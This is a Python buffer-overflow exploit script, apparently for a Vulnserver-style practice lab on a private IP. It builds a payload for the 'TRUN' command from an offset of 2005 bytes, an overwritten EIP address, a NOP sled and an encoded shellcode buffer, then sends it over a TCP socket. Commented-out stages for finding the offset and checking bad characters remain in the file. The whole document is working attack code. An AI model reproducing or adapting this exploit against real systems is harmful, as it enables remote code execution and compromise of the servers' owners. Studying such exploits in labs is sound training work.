#!/usr/bin/python3
import sys, socket
from time import sleep

RHOST = '10.0.2.15'
RPORT = 9999

# pattern = b""
offset = 2005
EIP = b"\xaf\x11\x50\x62"
nops = b"\x90" * 32

buf =  b""
buf += b"\xdd\xc6\xd9\x74\x24\xf4\x58\xbb\xc4\x6c\xea\x3d"
buf += b"\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x58\x13\x03\x9c"
buf += b"\x7f\x08\xc8\xe0\x68\x4e\x33\x18\x69\x2f\xbd\xfd"
buf += b"\x58\x6f\xd9\x76\xca\x5f\xa9\xda\xe7\x14\xff\xce"
buf += b"\x7c\x58\x28\xe1\x35\xd7\x0e\xcc\xc6\x44\x72\x4f"
buf += b"\x45\x97\xa7\xaf\x74\x58\xba\xae\xb1\x85\x37\xe2"
buf += b"\x6a\xc1\xea\x12\x1e\x9f\x36\x99\x6c\x31\x3f\x7e"
buf += b"\x24\x30\x6e\xd1\x3e\x6b\xb0\xd0\x93\x07\xf9\xca"
buf += b"\xf0\x22\xb3\x61\xc2\xd9\x42\xa3\x1a\x21\xe8\x8a"
buf += b"\x92\xd0\xf0\xcb\x15\x0b\x87\x25\x66\xb6\x90\xf2"
buf += b"\x14\x6c\x14\xe0\xbf\xe7\x8e\xcc\x3e\x2b\x48\x87"
buf += b"\x4d\x80\x1e\xcf\x51\x17\xf2\x64\x6d\x9c\xf5\xaa"
buf += b"\xe7\xe6\xd1\x6e\xa3\xbd\x78\x37\x09\x13\x84\x27"
buf += b"\xf2\xcc\x20\x2c\x1f\x18\x59\x6f\x48\xed\x50\x8f"
buf += b"\x88\x79\xe2\xfc\xba\x26\x58\x6a\xf7\xaf\x46\x6d"
buf += b"\xf8\x85\x3f\xe1\x07\x26\x40\x28\xcc\x72\x10\x42"
buf += b"\xe5\xfa\xfb\x92\x0a\x2f\xab\xc2\xa4\x80\x0c\xb2"
buf += b"\x04\x71\xe5\xd8\x8a\xae\x15\xe3\x40\xc7\xbc\x1e"
buf += b"\x03\xe2\x40\x22\xd7\x9a\x42\x22\xc2\xe9\xca\xc4"
buf += b"\x86\x1d\x9b\x5f\x3f\x87\x86\x2b\xde\x48\x1d\x56"
buf += b"\xe0\xc3\x92\xa7\xaf\x23\xde\xbb\x58\xc4\x95\xe1"
buf += b"\xcf\xdb\x03\x8d\x8c\x4e\xc8\x4d\xda\x72\x47\x1a"
buf += b"\x8b\x45\x9e\xce\x21\xff\x08\xec\xbb\x99\x73\xb4"
buf += b"\x67\x5a\x7d\x35\xe5\xe6\x59\x25\x33\xe6\xe5\x11"
buf += b"\xeb\xb1\xb3\xcf\x4d\x68\x72\xb9\x07\xc7\xdc\x2d"
buf += b"\xd1\x2b\xdf\x2b\xde\x61\xa9\xd3\x6f\xdc\xec\xec"
buf += b"\x40\x88\xf8\x95\xbc\x28\x06\x4c\x05\x48\xe5\x44"
buf += b"\x70\xe1\xb0\x0d\x39\x6c\x43\xf8\x7e\x89\xc0\x08"
buf += b"\xff\x6e\xd8\x79\xfa\x2b\x5e\x92\x76\x23\x0b\x94"
buf += b"\x25\x44\x1e"

# badc =  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
# badc += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
# badc += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
# badc += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
# badc += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
# badc += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
# badc += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
# badc += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# Finding the offset
# payload = pattern

# Verification test
# payload = b"A" * offset + EIP + b"\xCC" + badc

# Final payload
payload = b"A" * offset + EIP + nops + buf

try:
	# Payload options
	exploit = b"TRUN /." + payload
	# exploit = shellcode + b"\r\n"
	# exploit = shellcode

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((RHOST,RPORT))
	s.send((exploit))
	s.recv(1024)
	s.close()
	print("Buffer sent")
except:
	print ("Error connecting to server")
	sys.exit()
